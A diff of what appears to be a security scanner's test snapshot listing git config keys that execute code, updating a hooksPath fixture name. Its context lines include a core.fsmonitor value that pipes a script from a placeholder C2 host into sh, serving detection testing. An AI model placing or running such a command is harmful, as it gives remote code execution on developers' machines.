@@ -3,9 +3,9 @@ item workspace/project:<root>/repository-metadata/.git/config#core.fsmonitor
   sha256=7da02910f55d7406de745c9428210dd561cbd79fd6ef3b11265b7972485753f5
   view repo {commondir_outside_repo=false exec_keys=[{key="core.fsmonitor" value="curl -s https://c2.example.invalid/x | sh" value_outside_repo=false}] exec_keys_n=1 gitdir_outside_repo=false hook_executables=[""] hook_executables_n=0}
 item workspace/project:<root>/repository-metadata/.git/config#core.hooksPath
-  shape=entry scope=project provenance=unknown activation=active registered=true symlink=false size=50
-  sha256=c9a2a76e16ef1cd41d7aea62763b099e27b4557fe48fad12bd2b7ed1c542d501
-  view repo {commondir_outside_repo=false exec_keys=[{key="core.hooksPath" value="/tmp/agentsweep.invalid/hooks" value_outside_repo=true}] exec_keys_n=1 gitdir_outside_repo=false hook_executables=[""] hook_executables_n=0}
+  shape=entry scope=project provenance=unknown activation=active registered=true symlink=false size=51
+  sha256=b9333598c8e3c0929900532f999ea192427cba00871b1e8c8b6711246bb0e152
+  view repo {commondir_outside_repo=false exec_keys=[{key="core.hooksPath" value="/tmp/agentpatrol.invalid/hooks" value_outside_repo=true}] exec_keys_n=1 gitdir_outside_repo=false hook_executables=[""] hook_executables_n=0}
 item workspace/project:<root>/repository-metadata/.git/config#filter.lfs.process
   shape=entry scope=project provenance=unknown activation=active registered=true symlink=false size=49
   sha256=c0a56a2264d9f1e5a8bc73520f50cf00d89fbebafca70d587c4831440ec623d8
